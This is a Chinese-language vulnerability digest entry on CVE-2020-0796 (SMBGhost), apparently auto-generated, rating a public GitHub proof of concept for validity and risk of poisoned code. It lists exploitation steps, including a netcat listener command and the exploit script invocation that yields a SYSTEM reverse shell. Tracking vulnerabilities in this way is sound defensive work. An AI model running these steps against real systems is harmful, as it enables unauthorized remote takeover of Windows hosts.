## CVE-2020-0796 (SMBGhost)

**漏洞编号:** CVE-2020-0796

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Windows SMBv3

**危害等级:** 高危，未经身份验证的攻击者可以远程执行任意代码

**影响版本:** Windows 10 Version 1903, 1909 和 Windows Server, version 1903, 1909

**利用条件:** 目标系统需要启用SMBv3协议且未打补丁，攻击者需要能够通过网络访问目标系统的445端口。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2020-0796，又名SMBGhost，是Microsoft SMBv3协议中的一个远程代码执行漏洞。该漏洞存在于SMBv3处理特定请求的方式中，允许未经身份验证的攻击者通过发送特制的SMB数据包到易受攻击的SMBv3服务器，从而在目标系统上执行任意代码。

**有效性：**
根据漏洞库信息和搜索结果，存在公开可用的PoC代码，并且CISA也发布了警报，表明存在针对未修补系统的实际攻击。提供的PoC代码看起来是一个用于演示目的的完整利用程序，它包含计算目标偏移量的脚本以及实际的漏洞利用脚本。

**投毒风险：**
该PoC代码的投毒风险评估为10%。理由如下：
*   代码来源：虽然代码基于ZecOps的PoC，但经过了修改和重新分发，存在引入恶意代码的可能性。
*   复杂性：该漏洞利用涉及复杂的内存操作和协议交互，这使得在代码中隐藏恶意逻辑成为可能。
*   权限要求：成功利用此漏洞会导致系统级别的代码执行，这意味着任何植入的后门或恶意代码都将以最高权限运行。
*   文件内容分析：`README.md`文件描述了如何设置攻击机和目标机，并提供了详细的步骤来计算偏移量和执行漏洞利用。虽然描述看起来是良性的，但仔细检查`SMBleedingGhost.py`脚本是必要的，以确保其中没有隐藏的恶意代码。例如，在建立反向shell连接后，可能会执行额外的命令以下载和执行其他payload。

**利用方式：**
1.  **环境准备：**搭建攻击机和目标机（目标机为存在漏洞的Windows 10/Server版本，禁用防火墙）。
2.  **偏移量计算：**在目标机上运行`calc_target_offsets.bat`脚本，获取内存偏移量。
3.  **脚本配置：**在攻击机上，用目标机计算出的偏移量更新`SMBleedingGhost.py`脚本中的`OFFSETS`变量。
4.  **监听端口：**在攻击机上使用Netcat(`ncat -lvp 4321`)设置监听端口。
5.  **执行漏洞利用：**在攻击机上运行`python SMBleedingGhost.py <target_ip> <attacker_ip> <port>`，其中`<target_ip>`是目标机的IP地址，`<attacker_ip>`是攻击机的IP地址，`<port>`是监听端口。
6.  **获取Shell：**如果漏洞利用成功，攻击机将收到来自目标机的反向Shell，并获得SYSTEM权限。

**项目地址:** [tdevworks/CVE-2020-0796-SMBGhost-Exploit-Demo](https://github.com/tdevworks/CVE-2020-0796-SMBGhost-Exploit-Demo)

**漏洞详情:** [CVE-2020-0796](https://nvd.nist.gov/vuln/detail/CVE-2020-0796)